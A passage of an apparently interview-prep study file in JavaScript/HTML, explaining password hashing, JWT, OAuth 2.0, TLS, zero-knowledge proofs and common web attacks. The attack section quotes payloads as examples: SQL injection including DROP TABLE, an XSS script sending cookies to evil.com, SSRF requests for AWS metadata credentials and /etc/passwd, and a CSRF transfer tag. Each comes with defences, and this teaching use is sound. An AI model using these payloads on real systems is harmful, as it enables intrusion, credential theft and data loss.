+{l:"Mental model",b:`<div class="analogy">SHA-256 is a revolving door — an attacker can spin through a million passwords per second. bcrypt is a time-lock vault door — you can only open it every 100ms no matter how strong you are. Argon2id is a vault door that also floods the room with 64MB of water — even if you have a superpower that opens doors fast, you can only do one at a time because you can't drain the room quickly enough. The salt is making every door a unique combination that can't be precomputed.</div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">Why is bcrypt better than SHA-256 for passwords, even with a salt?</div><div class="a">Speed. Salted SHA-256 prevents rainbow tables but an attacker can still run 500M SHA-256 hashes/second per GPU. A 6-character password cracked in milliseconds. bcrypt at cost=12 runs ~100ms per hash — 5000x slower. An attacker gets 10 guesses/second per GPU instead of 500M. The work factor lets you re-tune as hardware improves without changing the stored hash format.</div></div>
+<div class="iq"><div class="q">What makes Argon2id memory-hard and why does that matter?</div><div class="a">Argon2 fills a configurable amount of RAM (e.g. 64MB) with pseudorandom data during hashing, and the final hash depends on all of it. To parallelise cracking on a GPU with 10,000 cores: each core needs 64MB → 640GB GPU RAM needed. GPUs typically have 8-24GB total. Memory hardness physically limits parallelism in ways that iteration count alone cannot.</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">Hash Functions (underlying primitive)</span><span class="cp">Common Attacks (credential stuffing)</span><span class="cp">JWT (session after login)</span><span class="cp">OAuth 2.0 (alternative to passwords)</span></div>`}
+]},
+
+// 06 — JWT
+{tag:"Applied Cryptography",title:"JWT — JSON Web Tokens",
+oneliner:"A JWT is a compact, URL-safe token consisting of a base64-encoded header and payload plus a cryptographic signature — enabling stateless authentication where the server needs no session store.",
+secs:[
+{l:"Structure",b:`<div class="code">JWT = base64url(header) + "." + base64url(payload) + "." + signature
+
+// Header
+{ "alg": "RS256",   // signature algorithm
+  "typ": "JWT" }
+
+// Payload (claims)
+{ "sub": "user:123",          // subject — who this is about
+  "iss": "auth.myapp.com",    // issuer
+  "aud": "api.myapp.com",     // audience — who this is for
+  "exp": 1735689600,          // expiration timestamp (Unix)
+  "iat": 1735686000,          // issued at
+  "roles": ["admin","user"],  // custom claims
+  "email": "somesh@example.com" }
+
+// Signature (for RS256):
+signature = RSA_SIGN(private_key, base64url(header) + "." + base64url(payload))
+
+IMPORTANT: the payload is base64url-ENCODED, not encrypted.
+Anyone can decode it. Never put sensitive data (passwords, credit cards) in JWT payload.
+Signature only proves it wasn't tampered with — it doesn't hide the contents.</div>`},
+{l:"HS256 vs RS256 vs ES256",b:`<div class="card"><div class="card-name">HS256 — HMAC-SHA256 (symmetric)</div><div class="card-desc">One secret key used to both sign and verify. Simpler, faster. Problem: every service that needs to verify tokens must have the shared secret. If any service is compromised, attacker can forge tokens for all services. Use only when: single service controls both issuance and verification (e.g. a monolith). Never share the signing secret with client-side code.</div></div>
+<div class="card"><div class="card-name">RS256 — RSA-SHA256 (asymmetric)</div><div class="card-desc">Auth server signs with private key. Any service verifies with public key (published as JWKS endpoint). Compromising a service that only has the public key cannot forge tokens. Standard for microservices and OAuth 2.0. Auth0, Okta, AWS Cognito default to RS256.</div></div>
+<div class="card"><div class="card-name">ES256 — ECDSA P-256 with SHA-256</div><div class="card-desc">Same split-key security as RS256 with smaller signatures (64 bytes vs 256 bytes for RS256). Faster verification. Modern preference. Used by: Apple Sign-In, some FIDO implementations.</div></div>`},
+{l:"JWT vulnerabilities — what interviewers test",b:`<div class="code">// VULNERABILITY 1: Algorithm "none" attack
+// Some old libraries accepted {"alg":"none"} → no signature required!
+// Attacker modifies payload, sets alg=none, sends tampered token.
+// Fix: ALWAYS validate the "alg" field against an allowlist. Reject "none".
+
+// VULNERABILITY 2: RS256 → HS256 confusion attack
+// RS256: server signs with RSA private key, verifies with RSA public key.
+// HS256: server signs AND verifies with the same secret key.
+// Attack: attacker takes the server's PUBLIC KEY (which is public!)
+//         creates an HS256 token signed with that public key as the HMAC secret
+//         sends to server — if server blindly trusts alg header and the
+//         verify code uses the public key as the HMAC key → token accepted!
+// Fix: ALWAYS specify expected algorithm explicitly, never take it from the token.
+
+// VULNERABILITY 3: JWT stored in localStorage → XSS steals token
+// Any JavaScript on the page can read localStorage.
+// Fix: store JWTs in HttpOnly cookies (inaccessible to JavaScript).
+// Trade-off: cookies need CSRF protection.
+
+// VULNERABILITY 4: missing exp validation → tokens live forever
+// Fix: always validate exp, iat, aud, iss claims server-side.</div>`},
+{l:"Access tokens vs refresh tokens",b:`<div class="card"><div class="card-name">Access token (JWT)</div><div class="card-desc">Short-lived (15 minutes–1 hour). Stateless — server validates signature only, no DB lookup. Sent with every API request (Authorization: Bearer header). Revocation problem: once issued, a valid access token can't be revoked before expiry (JWT is stateless — there's no blacklist unless you add one).</div></div>
+<div class="card"><div class="card-name">Refresh token</div><div class="card-desc">Long-lived (days–weeks). Opaque (random string, not JWT). Stored in DB — can be revoked by deleting the DB record. Used ONLY to obtain new access tokens from the auth server. Must be stored securely (HttpOnly cookie, never localStorage). Rotation: each use of a refresh token issues a new refresh token and invalidates the old one — detects theft.</div></div>`},
+{l:"JWT vs session tokens",b:`<table class="ct"><tr><th></th><th>JWT (stateless)</th><th>Session token (stateful)</th></tr>
+<tr><td>Server storage</td><td>None (stateless)</td><td>Session store (Redis/DB)</td></tr>
+<tr><td>Horizontal scaling</td><td>Easy (any server verifies)</td><td>Needs shared session store</td></tr>
+<tr><td>Revocation</td><td>Difficult (wait for expiry)</td><td>Instant (delete session)</td></tr>
+<tr><td>Token size</td><td>~500 bytes</td><td>~32 bytes (just an ID)</td></tr>
+<tr><td>Payload visible</td><td>Yes (encoded, not encrypted)</td><td>No (opaque ID)</td></tr></table>`},
+{l:"Mental model",b:`<div class="analogy">A JWT is a signed boarding pass. It contains your name, flight, seat, and expiry printed on it (payload) — anyone can read it. The airline's seal (signature) proves it's genuine. At the gate, the agent verifies the seal (public key) without calling headquarters (stateless) — fast, scalable. Problem: if the airline voids your ticket (revokes), the gate agent still accepts it until it expires (can't revoke without a call to HQ / blacklist). A session token is your claim stub — just a number the agent looks up in the system, which can be invalidated instantly.</div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">Can a user modify their JWT payload to give themselves admin access?</div><div class="a">No, if implemented correctly. The signature covers the encoded header + payload. Modifying any bit in the payload invalidates the signature. The server rejects a token whose signature doesn't match. The attack works only if: the server doesn't validate the signature, uses a weak secret (HS256 with guessable key), or is vulnerable to the alg=none attack. Never trust the payload without verifying the signature first.</div></div>
+<div class="iq"><div class="q">How do you handle JWT revocation for immediate logout?</div><div class="a">Pure JWTs can't be revoked — the server needs no state. Solutions: (1) Keep access tokens very short-lived (15 min) — the window of unauthorized access is bounded. (2) Maintain a token blacklist in Redis — check on every request (adds latency, kills statelessness). (3) Rotate the signing secret — invalidates ALL tokens (too nuclear for most cases). (4) Stateful sessions for security-critical operations. Real systems usually combine: short JWT access tokens + revocable refresh tokens in DB.</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">Hash Functions (HMAC-SHA256 = HS256)</span><span class="cp">Digital Signatures (RS256)</span><span class="cp">OAuth 2.0 (JWTs as access tokens)</span><span class="cp">Common Attacks (XSS steals tokens)</span><span class="cp">Java: Spring Security JWT filters</span></div>`}
+]},
+
+// 07 — OAuth 2.0
+{tag:"Identity & Access",title:"OAuth 2.0",
+oneliner:"OAuth 2.0 is an authorisation framework that lets a user grant a third-party application limited access to their resources on another service — without sharing their credentials.",
+secs:[
+{l:"The core problem",b:`<p>You use a third-party app (e.g. a travel planner) that needs read access to your Google Calendar. The naive solution: give the app your Google password. Problems: the app gets access to everything, you can't revoke access without changing your password, you've exposed your credentials to a third party. OAuth solves this: Google issues a time-limited token authorising only calendar read access, directly to the app, and you never share your password.</p>`},
+{l:"Roles",b:`<div class="code">Resource Owner:      You (the user)
+Resource Server:     Google Calendar API (holds your data)
+Client:              The travel planner app (wants access to your data)
+Authorization Server: Google's auth server (accounts.google.com) — issues tokens
+
+OAuth is an AUTHORISATION protocol, not an AUTHENTICATION protocol.
+It answers "what can this app do?" not "who is this user?"
+OpenID Connect (OIDC) builds on OAuth 2.0 to add authentication (identity tokens).</div>`},
+{l:"Authorization Code Flow — the secure default",b:`<ol class="steps">
+<li>App redirects user to Google: <code>accounts.google.com/oauth/authorize?client_id=...&redirect_uri=...&scope=calendar.read&state=xyz&response_type=code</code></li>
+<li>User sees Google's consent screen: "Travel App wants to read your calendar." User approves.</li>
+<li>Google redirects back to app with authorization code: <code>https://app.com/callback?code=AUTH_CODE&state=xyz</code></li>
+<li>App's backend exchanges the code for tokens by calling Google's token endpoint directly (server-to-server, with client_secret): <code>POST /oauth/token {code, client_id, client_secret, redirect_uri}</code></li>
+<li>Google returns: <code>{access_token, refresh_token, expires_in, id_token}</code></li>
+<li>App uses access_token to call <code>GET /calendar/events</code> on Google's API.</li>
+</ol>
+<p>Key security property: the access_token never touches the browser URL (unlike the auth code, which is single-use). The client_secret is only used server-to-server.</p>`},
+{l:"PKCE — Proof Key for Code Exchange",b:`<div class="card"><div class="card-name">PKCE (RFC 7636) — required for public clients</div><div class="card-desc">Public clients (mobile apps, SPAs) can't securely store a client_secret. Without PKCE: an attacker who intercepts the authorization code can exchange it for tokens. PKCE fix: the client generates a random code_verifier, hashes it to code_challenge (SHA-256), sends code_challenge with the auth request. When exchanging the code, sends the raw code_verifier. Auth server verifies hash(code_verifier) = code_challenge — only the original client can complete the exchange.</div></div>
+<div class="code">PKCE flow:
+  1. Client generates: code_verifier = random(32 bytes)
+  2. code_challenge = BASE64URL(SHA256(code_verifier))
+  3. Auth request includes: code_challenge, code_challenge_method=S256
+  4. Code intercepted by attacker → attacker doesn't have code_verifier → can't exchange
+  5. Legitimate client exchanges code + code_verifier → server verifies → tokens issued
+  
+PKCE is now recommended for ALL OAuth 2.0 clients, not just public ones.</div>`},
+{l:"Grant types",b:`<div class="card"><div class="card-name">Authorization Code + PKCE (recommended for most)</div><div class="card-desc">Browser/mobile apps. User interaction required. Secure: tokens never in URL, short-lived codes, PKCE protects against interception.</div></div>
+<div class="card"><div class="card-name">Client Credentials</div><div class="card-desc">Machine-to-machine. No user involved. Service A authenticates to auth server with client_id + client_secret, receives access token to call Service B. Used in: microservice auth, CI/CD pipelines, backend daemons.</div></div>
+<div class="card"><div class="card-name">Implicit (deprecated)</div><div class="card-desc">Was for SPAs: access token returned directly in URL fragment. Security problems: token in browser history, referrer headers. Replaced by Authorization Code + PKCE for SPAs. OAuth 2.1 removes it entirely.</div></div>
+<div class="card"><div class="card-name">Device Code</div><div class="card-desc">For input-constrained devices (Smart TVs, CLI tools). Device shows a code and URL; user logs in on another device. Device polls token endpoint until user approves.</div></div>`},
+{l:"OAuth vs OpenID Connect",b:`<div class="code">OAuth 2.0:  AUTHORISATION only
+  → "This app can read your calendar"
+  → access_token tells the Resource Server what the app can do
+  → You can't tell who the user is from an OAuth access token alone
+
+OpenID Connect (OIDC): AUTHENTICATION layer on top of OAuth 2.0
+  → "This user is somesh@gmail.com"
+  → Returns id_token (a JWT) containing user identity (sub, email, name)
+  → The /userinfo endpoint lets app fetch the user profile
+  → Used for SSO: "Sign in with Google/Apple/GitHub"
+
+OAuth 2.0 scope for OIDC: scope=openid profile email
+OIDC-compliant providers return: { access_token, id_token, refresh_token }</div>`},
+{l:"Mental model",b:`<div class="analogy">OAuth is a valet key. Your car has a master key (your Google password) and a valet key (OAuth access token). The valet key only opens the car and starts it — it doesn't open the boot or glovebox (limited scope). You hand it to the parking attendant (third-party app) without risking your house keys also being on the keyring. The valet key expires at midnight (token expiry). You can revoke it without changing your master key (token revocation). PKCE is the stub ticket you keep — even if someone films the attendant taking the key, they can't duplicate it without the stub.</div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">Why was the Implicit grant deprecated? What replaced it?</div><div class="a">Implicit returned the access_token directly in the URL fragment (#access_token=...). Problems: token visible in browser history, referrer headers leak it to third-party scripts, no client authentication. Replaced by Authorization Code + PKCE for SPAs: the code in the URL is single-use and short-lived; the actual token is fetched server-side (or via a secure back-channel). PKCE makes it safe even without a client_secret.</div></div>
+<div class="iq"><div class="q">What is the difference between OAuth 2.0 and OpenID Connect?</div><div class="a">OAuth 2.0 is an authorisation framework — it grants access to resources on behalf of a user, but doesn't tell the client who the user is. OpenID Connect adds authentication as a thin layer on OAuth 2.0: the auth server returns an id_token (a signed JWT) containing the user's identity (sub, email, name). "Sign in with Google" uses OIDC. "Grant Dropbox access to your Google Drive" uses OAuth 2.0.</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">JWT (access tokens as JWTs)</span><span class="cp">Digital Signatures (id_token signing)</span><span class="cp">PKI (JWKS endpoint for public keys)</span><span class="cp">Common Attacks (CSRF in OAuth)</span><span class="cp">Java Spring Security OAuth</span></div>`}
+]},
+
+// 08 — Common Attacks
+{tag:"Security",title:"Common Attacks",
+oneliner:"SQL injection, XSS, CSRF, SSRF, replay, and timing attacks are the most impactful classes of web security vulnerabilities — each exploits a specific failure to separate code from data, trust boundaries, or timing characteristics.",
+secs:[
+{l:"SQL Injection",b:`<div class="code">// Vulnerable code
+String query = "SELECT * FROM users WHERE name='" + username + "'";
+
+// Attacker input: username = "' OR '1'='1"
+// Resulting query: SELECT * FROM users WHERE name='' OR '1'='1'
+// '1'='1' is always true → returns ALL users
+
+// Attacker input: "'; DROP TABLE users; --"
+// Resulting query: SELECT * FROM users WHERE name=''; DROP TABLE users; --'
+// Second statement executes → table deleted
+
+// Fix 1: Parameterised queries (prepared statements) — ALWAYS use
+PreparedStatement ps = conn.prepareStatement(
+    "SELECT * FROM users WHERE name = ?");
+ps.setString(1, username);  // username is data, never interpreted as SQL
+
+// Fix 2: ORM (Hibernate, JPA) — uses parameterised queries internally
+// Fix 3: Input validation + allowlisting (secondary defence, not primary)
+// Never: string concatenation of user input into SQL</div>`},
+{l:"XSS — Cross-Site Scripting",b:`<div class="card"><div class="card-name">Stored XSS</div><div class="card-desc">Attacker injects malicious script that is stored in the database. Rendered for every user who views that content. Example: attacker posts a comment with &lt;script&gt;document.location='evil.com?c='+document.cookie&lt;/script&gt;. Every user who views the comment has their session cookie sent to the attacker.</div></div>
+<div class="card"><div class="card-name">Reflected XSS</div><div class="card-desc">Malicious script in a URL parameter, reflected immediately in the response. Attacker sends the victim a crafted link. Example: search?q=&lt;script&gt;...&lt;/script&gt; — if the page renders the query parameter unsanitised, the script runs in the victim's browser.</div></div>
+<div class="code">// Prevention:
+// 1. Output encoding — escape HTML special chars before rendering
+   "&lt;" → "&amp;lt;"   ">" → "&amp;gt;"   '"' → "&amp;quot;"
+
+// 2. Content Security Policy (CSP) header — browsers refuse inline scripts
+   Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
+
+// 3. HttpOnly cookies — JavaScript can't read them (mitigates impact)
+// 4. Modern frameworks (React, Angular) escape by default — use dangerouslySetInnerHTML sparingly</div>`},
+{l:"CSRF — Cross-Site Request Forgery",b:`<div class="code">Attack: user is logged into bank.com. Attacker sends them a page with:
+  &lt;img src="https://bank.com/transfer?to=attacker&amount=1000"&gt;
+When victim's browser loads this page, it sends the GET request to bank.com
+with the victim's cookies attached (browser includes cookies automatically).
+Bank sees valid session cookie → executes transfer.
+
+Prevention:
+  1. CSRF tokens: server generates random token, embeds in form/header.
+     Attacker's page can't read the token (same-origin policy).
+     Server validates token on every state-changing request.
+
+  2. SameSite cookie attribute:
+     SameSite=Strict: cookie NEVER sent in cross-site requests.
+     SameSite=Lax: sent only on top-level navigation GET requests.
+     SameSite=None: always sent (old behaviour). Requires Secure flag.
+     → Modern browsers default to Lax. Most sites set SameSite=Strict.
+
+  3. Verify Origin/Referer header (secondary check).
+  4. Require custom headers (X-Requested-With) — cross-site can't set custom headers.</div>`},
+{l:"SSRF — Server-Side Request Forgery",b:`<div class="code">Attack: server fetches a URL provided by the user.
+  // Vulnerable: server fetches user-provided URL
+  GET /api/fetch?url=https://internal-service/admin
+
+  Attacker provides:
+    url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    ↑ AWS EC2 metadata endpoint — returns IAM credentials!
+
+  Or: url=http://localhost:6379/ (internal Redis)
+      url=http://internal-postgres:5432/ (internal database)
+      url=file:///etc/passwd (local file read)
+
+  Impact: access cloud metadata (IAM creds), internal services,
+          scan internal network, RCE via exploiting internal endpoints.
+
+Prevention:
+  - Allowlist valid target domains/IPs
+  - Block private IP ranges (10.x, 172.16.x, 192.168.x, 169.254.x)
+  - Validate and resolve URLs server-side before making request
+  - Run fetch service in isolated network with no access to internal services
+  - Capital One breach (2019): SSRF via WAF → AWS metadata → IAM creds → S3 data</div>`},
+{l:"Replay attacks",b:`<div class="code">Attack: attacker captures a valid request (login, payment, API call)
+        and re-sends it later or multiple times.
+
+Examples:
+  Payment API: capture "charge $10" request → resend 100 times → charge $1000
+  Auth token: capture a valid JWT → use it until it expires
+
+Mitigations:
+  1. Short-lived tokens (JWT exp, OAuth access token 15-min TTL)
+  2. Nonces: unique random value in each request, stored by server.
+     Same nonce rejected on second use.
+  3. Timestamps: server rejects requests older than N seconds.
+     Attacker must replay within the window.
+  4. HTTPS: encrypts requests in transit (capturing requires MITM + cert attack)
+  5. Sequence numbers: each request has an incrementing counter.
+     Out-of-order or duplicate = reject.</div>`},
+{l:"Timing attacks",b:`<div class="code">// Vulnerable: short-circuit comparison
+boolean verify(String userToken, String storedToken) {
+    return userToken.equals(storedToken);  // exits on first mismatch
+}
+// String.equals() returns false at the FIRST different character.
+// Timing: if attacker sends tokens that match 1 char, 2 chars, 3 chars...
+// the response time increases. Attacker brute-forces byte by byte
+// by measuring response time differences of ~nanoseconds.
+
+// Fix: constant-time comparison (compares all bytes regardless of mismatch)
+boolean verify(byte[] a, byte[] b) {
+    if (a.length != b.length) return false;
+    int result = 0;
+    for (int i = 0; i < a.length; i++) {
+        result |= a[i] ^ b[i];  // XOR accumulates differences
+    }
+    return result == 0;  // 0 = no differences = equal
+    // Same execution time regardless of where the mismatch is
+}
+
+// Java: MessageDigest.isEqual() — constant-time byte array comparison
+// Never use == or .equals() for comparing secrets, tokens, HMACs</div>`},
+{l:"Mental model",b:`<div class="analogy">SQL injection: you're ordering at a restaurant by reading from a card, but the card says "give me everything and also fire the chef." The waiter blindly reads it. Parameterised queries: the waiter only accepts items from the fixed menu, not instructions embedded in your order. XSS: someone spray-painted instructions on a whiteboard in the office — every new employee reads it and follows the instructions. CSRF: a puppeteer pulls your hands to type on the bank website while you're looking away — your hands have the authentication ring (cookie), not the puppeteer. SSRF: you ask the server to fetch a document, but you hand it your house key along with the address of the manager's office. Timing attack: safecracking by listening to clicks — the lock tells you when you've got a digit right by how long before it clicks.</div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">How does CSRF work and how does SameSite=Strict prevent it?</div><div class="a">CSRF exploits the browser's automatic cookie attachment: a malicious page makes the victim's browser send a request to bank.com, and the browser automatically attaches the bank.com session cookie. The bank sees a valid authenticated request it didn't know was forged. SameSite=Strict: the cookie is never sent in any cross-origin request — if the request originates from attacker.com, no bank.com cookies are included. The request reaches the bank unauthenticated and is rejected.</div></div>
+<div class="iq"><div class="q">What is an SSRF attack and how was it used in the Capital One breach?</div><div class="a">SSRF: attacker tricks the server into making HTTP requests to internal/unintended destinations by controlling a URL parameter. Capital One: a WAF running on an EC2 instance had an SSRF vulnerability. Attacker made it request http://169.254.169.254/latest/meta-data/ — AWS's instance metadata service. Retrieved the EC2's IAM role credentials. Used those credentials to list and download S3 buckets. 100M customer records compromised. Prevention: block metadata IP ranges, use IMDSv2 (requires PUT request with session token, harder to exploit via SSRF).</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">JWT (XSS steals tokens)</span><span class="cp">OAuth 2.0 (state param prevents CSRF)</span><span class="cp">Hash Functions (timing-safe HMAC comparison)</span><span class="cp">TLS (prevents replay via sequence numbers)</span><span class="cp">System Design (WAF, rate limiting)</span></div>`}
+]},
+
+// 09 — TLS Deep Dive
+{tag:"Protocols",title:"TLS Deep Dive",
+oneliner:"TLS is a two-layer protocol — the Record Protocol provides confidentiality and integrity for application data; the Handshake Protocol negotiates keys and authenticates the server — with TLS 1.3 doing this in one round trip using forward-secret ECDHE.",
+secs:[
+{l:"Two-layer architecture",b:`<div class="code">TLS = Record Protocol + Handshake Protocol
+
+Record Protocol (running layer — for actual data):
+  Receives application data (HTTP, WebSocket, etc.)
+  Fragments into records (max 16KB)
+  Encrypts + MACs each record (AES-256-GCM)
+  Adds: content type, version, length, encrypted payload + auth tag
+
+Handshake Protocol (setup layer — run once per connection):
+  Negotiates: cipher suite, protocol version
+  Authenticates server (certificate) and optionally client
+  Establishes shared secret (ECDHE key exchange)
+  Derives session keys for Record Protocol
+  
+Alert Protocol: signals errors (certificate_expired, decrypt_error)
+  Fatal alerts → connection terminated
+  Warning alerts → connection may continue (deprecated in TLS 1.3)</div>`},
+{l:"TLS 1.3 handshake — step by step",b:`<div class="code">CLIENT                                      SERVER
+────────────────────────────────────────────────────────
+
+ClientHello:
+  - TLS version: 1.3
+  - Client random (32 bytes)
+  - Cipher suites: [TLS_AES_256_GCM_SHA384, ...]
+  - Key share: client's ECDHE public key (P-256 or X25519)
+  - SNI: "api.myapp.com"  ←── tells server which cert to use
+  ──────────────────────────────────────────────────────────────→
+
+                                            ServerHello:
+                                              - Server random
+                                              - Chosen cipher suite
+                                              - Key share: server's ECDHE pub key
+                                            (both sides now compute shared secret)
+                                            
+                                            {EncryptedExtensions}  ← encrypted from here
+                                            {Certificate}          ← server's cert chain
+                                            {CertificateVerify}    ← signature over handshake
+                                            {Finished}             ← MAC over transcript
+                                            ←──────────────────────────────────────────────
+
+Client: verify certificate chain, verify CertificateVerify signature
+{Finished}   ← MAC over transcript
+─────────────────────────────────────────────────────────────────────→
+
+Application data (AES-256-GCM encrypted)   ←─────────────────────────────────
+
+Total: 1 RTT before data flows (0-RTT resumption possible)</div>`},
+{l:"ECDHE and forward secrecy",b:`<div class="code">ECDHE = Elliptic Curve Diffie-Hellman Ephemeral
+
+Key exchange without transmitting the secret:
+  Both sides generate ephemeral (per-connection) key pairs:
+    Client: c_priv, c_pub = ECDH.generate()
+    Server: s_priv, s_pub = ECDH.generate()
+  
+  Exchange public keys (in ClientHello / ServerHello)
+  
+  Shared secret: client computes ECDH(c_priv, s_pub)
+                 server computes ECDH(s_priv, c_pub)
+                 Both equal the same value! (ECDH property)
+  
+  "E" = Ephemeral: key pairs are DISCARDED after the handshake
+  
+Forward secrecy: if the server's LONG-TERM private key is stolen later,
+  past session recordings cannot be decrypted because the ephemeral key
+  used for that session is GONE. Each session has independent keys.
+
+Without forward secrecy (RSA key exchange — deprecated in TLS 1.3):
+  Client encrypts premaster secret with server's RSA public key.
+  If server's RSA private key stolen → attacker decrypts ALL past sessions.
+  This is why TLS 1.3 mandates ECDHE — RSA key exchange is removed.</div>`},
+{l:"Cipher suite anatomy",b:`<div class="code">TLS 1.3 cipher suites (streamlined — authentication separate from cipher):
+  TLS_AES_256_GCM_SHA384
+  │    │         │
+  │    │         └─ HKDF hash (for key derivation)
+  │    └─────────── Bulk cipher (AES-256 in GCM mode — AEAD)
+  └──────────────── Protocol prefix
+
+TLS 1.3 removed: RC4, 3DES, MD5, SHA-1, RSA key exchange,
+  static DH (no forward secrecy), export-grade ciphers (FREAK attack)
+
+HKDF (HMAC-based Key Derivation Function):
+  Derives multiple keys from the ECDHE shared secret:
+  - client_write_key  (client → server encryption)
+  - server_write_key  (server → client encryption)
+  - client_write_IV   (initialisation vector)
+  - server_write_IV
+  Handshake keys and application keys are derived separately.</div>`},
+{l:"SNI — Server Name Indication",b:`<p>When a TLS ClientHello is sent, the client includes the hostname it wants (SNI extension). This allows one IP address to serve multiple TLS-protected domains (virtual hosting). The server selects the right certificate before the TLS handshake completes. Without SNI: servers could only serve one HTTPS domain per IP — economically infeasible. Note: SNI is sent in plaintext in TLS 1.2/1.3 (before encryption is established) — your ISP can see which HTTPS sites you visit by reading SNI. ECH (Encrypted Client Hello) in TLS 1.3 draft encrypts the SNI.</p>`},
+{l:"Mental model",b:`<div class="analogy">TLS is a secure diplomatic meeting. The handshake is the formal credential exchange at the door: both sides present and verify IDs (certificate chain), agree on a communication method (cipher suite), and use a clever trick to establish a private meeting language (ECDHE) that neither could have prepared beforehand and that leaves no evidence (forward secrecy — ephemeral keys discarded). The record protocol is the actual meeting: all conversation is whispered in the agreed private language (AES-256-GCM), and every sentence is authenticated (the GCM auth tag proves it hasn't been tampered with).</div>`},
+{l:"Interview perspective",b:`
+<div class="iq"><div class="q">What is forward secrecy and why did TLS 1.3 make it mandatory?</div><div class="a">Forward secrecy: compromise of the server's long-term private key does not enable decryption of past sessions. Achieved by ECDHE — ephemeral key pairs used for each session are discarded immediately after key derivation. TLS 1.3 mandates ECDHE because: in TLS 1.2 with RSA key exchange, the client encrypted the premaster secret with the server's RSA public key. If the RSA private key was stolen (or subpoenaed), all recorded sessions could be decrypted retroactively. NSA mass-recording of TLS traffic made this a real concern.</div></div>
+<div class="iq"><div class="q">Why does TLS 1.3 complete the handshake in 1 RTT instead of TLS 1.2's 2?</div><div class="a">TLS 1.2: ClientHello → ServerHello+Certificate+ServerDone (1 RTT) → ClientKeyExchange+ChangeCipherSpec+Finished → ServerFinished (2nd RTT) → then data. TLS 1.3: Client immediately sends key share in ClientHello. Server responds with key share + certificate + Finished in one flight (can immediately derive keys). Client verifies and sends Finished. Data can flow immediately after — 1 RTT. Additionally, TLS 1.3's 0-RTT allows data with the first message on session resumption using a pre-shared session ticket.</div></div>`},
+{l:"Connects to",b:`<div class="connects"><span class="cp">Symmetric vs Asymmetric (hybrid in TLS)</span><span class="cp">PKI (certificate chain verification)</span><span class="cp">Hash Functions (HKDF, cipher suite)</span><span class="cp">HTTP/2 (requires TLS in practice)</span><span class="cp">HTTP/3 / QUIC (TLS 1.3 integrated)</span></div>`}
+]},
+
+// 10 — ZKP
+{tag:"Advanced Cryptography",title:"Zero-Knowledge Proofs",
+oneliner:"A zero-knowledge proof is a cryptographic protocol that lets a prover convince a verifier that a statement is true — without revealing any information beyond the fact that the statement is true.",
+secs:[
+{l:"The three properties (formal)",b:`<div class="card"><div class="card-name">Completeness</div><div class="card-desc">If the statement is true and the prover is honest, an honest verifier will accept the proof. Honest provers can always prove true statements.</div></div>
+<div class="card"><div class="card-name">Soundness</div><div class="card-desc">If the statement is false, no cheating prover can convince an honest verifier (except with negligible probability). A liar cannot produce a valid proof.</div></div>
+<div class="card"><div class="card-name">Zero-knowledge</div><div class="card-desc">The verifier learns nothing beyond the fact that the statement is true. After the proof, the verifier cannot extract the prover's secret, cannot replay the proof to convince others, and cannot distinguish the proof from a simulation.</div></div>`},
+{l:"The cave analogy — intuition",b:`<div class="analogy">Imagine a cave with a magic door in the middle — it opens only if you know the secret password. The cave has two paths (A and B) from the entrance. Victor (verifier) stands at the entrance, Peggy (prover) claims to know the password. Protocol: 1. Victor waits outside. 2. Peggy enters and goes down either A or B at random. 3. Victor enters and shouts "Come out via path B!" (or A). 4. If Peggy knows the password: she opens the magic door, walks to B regardless of which path she took. 5. If Peggy doesn't know the password: she can only succeed 50% of the time (guessed right which path Victor would call). Repeat 100 times: probability of cheating = (1/2)^100 ≈ 10^-30. Victor becomes convinced Peggy knows the secret — without ever learning what the password is.</div>`},
+{l:"Interactive vs Non-interactive",b:`<div class="card"><div class="card-name">Interactive ZKP</div><div class="card-desc">The prover and verifier exchange multiple challenge-response rounds. As above. The proof is only valid for this specific verifier in this session — it cannot be replayed to others (the verifier could have simulated the interaction without the prover).</div></div>
+<div class="card"><div class="card-name">Non-interactive ZKP (zk-SNARK, zk-STARK)</div><div class="card-desc">Prover computes a single proof using a cryptographic hash as a "random oracle" (Fiat-Shamir heuristic) — no back-and-forth. The proof can be verified by anyone, anytime, without interacting with the prover. This is what blockchain applications use: a single proof submitted to a smart contract.</div></div>`},
+{l:"zk-SNARKs and zk-STARKs",b:`<div class="code">zk-SNARK (Succinct Non-interactive ARgument of Knowledge):
+  Proof size: ~200 bytes (regardless of computation complexity)
+  Verification: ~2ms (extremely fast)
+  Requires: trusted setup ceremony (a weakness)
+             if the ceremony is compromised, fake proofs possible
+  Used by: Zcash (private transactions), Ethereum L2 zkEVM (zkSync, Polygon zkEVM)
+
+zk-STARK (Scalable Transparent ARgument of Knowledge):
+  Proof size: ~100KB (larger than SNARK)
+  Verification: slower than SNARK
+  Requires: NO trusted setup (uses hash functions only)
+  Post-quantum secure (SNARK is not)
+  Used by: StarkWare (Ethereum L2), StarkNet</div>`},
+{l:"Real-world use cases",b:`<div class="card"><div class="card-name">Privacy-preserving authentication</div><div class="card-desc">Prove you are over 18 without revealing your date of birth. Prove you are a citizen without revealing which country. Prove you have sufficient bank balance without revealing the amount. The verifier gets a yes/no, not your data.</div></div>
+<div class="card"><div class="card-name">Blockchain — zkRollups (Ethereum L2)</div><div class="card-desc">Process 10,000 transactions off-chain, generate a ZKP proving they were all valid, post only the proof to Ethereum mainchain. Ethereum verifies one proof instead of 10,000 transactions. Scales throughput by 100-1000x while inheriting Ethereum's security. Used by zkSync, Polygon zkEVM, Starknet.</div></div>
+<div class="card"><div class="card-name">Private smart contracts</div><div class="card-desc">Execute smart contract logic confidentially. Prove the contract executed correctly without revealing inputs, state, or outputs to public observers. Zcash uses ZKPs for fully private cryptocurrency transactions.</div></div>
+<div class="card"><div class="card-name">Verifiable computation</div><div class="card-desc">Outsource a heavy computation to an untrusted server. Server returns result + ZKP that the computation was done correctly. You verify the proof (cheap) instead of redoing the computation. Used in cloud computing and ML inference verification.</div></div>`},
